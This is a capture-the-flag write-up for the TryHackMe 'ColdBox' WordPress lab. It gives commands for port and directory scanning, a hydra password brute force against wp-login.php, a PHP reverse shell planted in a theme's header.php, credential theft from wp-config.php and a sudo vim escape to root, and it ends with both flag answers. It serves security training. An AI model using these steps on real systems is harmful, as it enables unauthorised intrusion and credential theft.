# ColdBox

<div align="left">

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt="" width="168"><figcaption><p><a href="https://tryhackme.com/room/colddboxeasy">https://tryhackme.com/room/colddboxeasy</a></p></figcaption></figure>

</div>

🔗 [ColdBox](https://tryhackme.com/room/colddboxeasy)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.100.105`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.100.105 coldbox.thm" >> /etc/hosts

mkdir thm/coldbox.thm
cd thm/coldbox.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 coldbox.thm
PING coldbox.thm (10.10.100.105) 56(84) bytes of data.
64 bytes from coldbox.thm (10.10.100.105): icmp_seq=1 ttl=63 time=65.4 ms
64 bytes from coldbox.thm (10.10.100.105): icmp_seq=2 ttl=63 time=61.1 ms
64 bytes from coldbox.thm (10.10.100.105): icmp_seq=3 ttl=63 time=60.5 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 coldbox.thm -oG nmap/port_scan
```

```bash
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 63
4512/tcp open  unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open ports on the machine: 80, 4512

Now, we need to search which services are running on open ports:

```bash
nmap -p80,4512 -n -Pn -vvv -sCV --min-rate 5000 coldbox.thm -oN nmap/open_port
```

```bash
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4512/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Task 3 - User flag?

Then we can start to see website (port 80):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we can see that's a wordpress web site, then we can try to see page source for checking information disclosure.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

but we don't find precious info.

Another good thing to do, is find hidden paths on website using gobuster

```
gobuster dir -u coldbox.thm -w /usr/share/wordlists/dirb/common.txt
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Very good, we can start to check these web dir:

/hidden/

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Very good, there're precious info about usernames: C0ldd, Hugo and Philip.

We can confirm it watching error message at login in a default login path for wordpress: /wp-admin/

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Finally the's another good info

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we don't waste time, we can use wpscan to find user list, but we'll take it if we take results with our three users, then try to login with C0ldd/Hugo/Philip:password123 (what we've see in the hidden path).

Nothing to do, we need to use brute force attack.

Then, we save them in a file called users.txt, and run hydra with a password wordlist to take a brute force attack:

```bash
echo "C0ldd\nHugo\nPhilip" > users.txt
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt coldbox.thm -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C0ldd:9876543210
{% endhint %}

Now we can use this credentials to log in wordpress and ssh.

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Check user list, to see them and theirs role/permissions:

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

Very good, C0ldd is administrator.

Now, we need to access at machine using web shell, find it on our kali web-shells folder or use pentester monkey website:

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

We need to edit it using our credentials (LHOST and LPORT):

<div align="left">

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

</div>

and upload it on media library page:

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

But, trying to change extension, upload doesn't work.

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Then, we can try to use wordpress themes or plugins how vector to inject our web-shell.

Starting with themes, we edit header.php page in the twentyfifteen theme using the same php web-shell:

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Update file, run netcat listener on the same port '1234':

<div align="left">

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

</div>

Go to: [http://coldbox.thm/wp-content/themes/twentyfifteen/header.php](http://coldbox.thm/wp-content/themes/twentyfifteen/header.php)

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

We can upgrade this to a fully interactive shell by running:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

and retrieve credentials inside wp-config.php file.

```bash
cat /var/www/html/wp-config.php | grep "DB_USER"
#define('DB_USER', 'c0ldd');
cat /var/www/html/wp-config.php | grep "DB_PASSWORD"
#define('DB_PASSWORD', 'cybersecurity');
su c0ldd #inser psw and read flag.
```

we know credential for access how c0ldd user and read user.txt flag

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

</details>

### Task 4 - Root flag?

We can do sudo -l command to discover user's permissions.

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

We see that c0ldd user has root permissions for these commands, we can use gtfobins to find them.

[https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/) using vim sudo command below, we obtain a root permission:

```bash
sudo vim -c ':!/bin/sh'
```

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

spawn /bin/sh to use shell:

<div align="left">

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

</div>

Well done! Root flag found!

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=

</details>
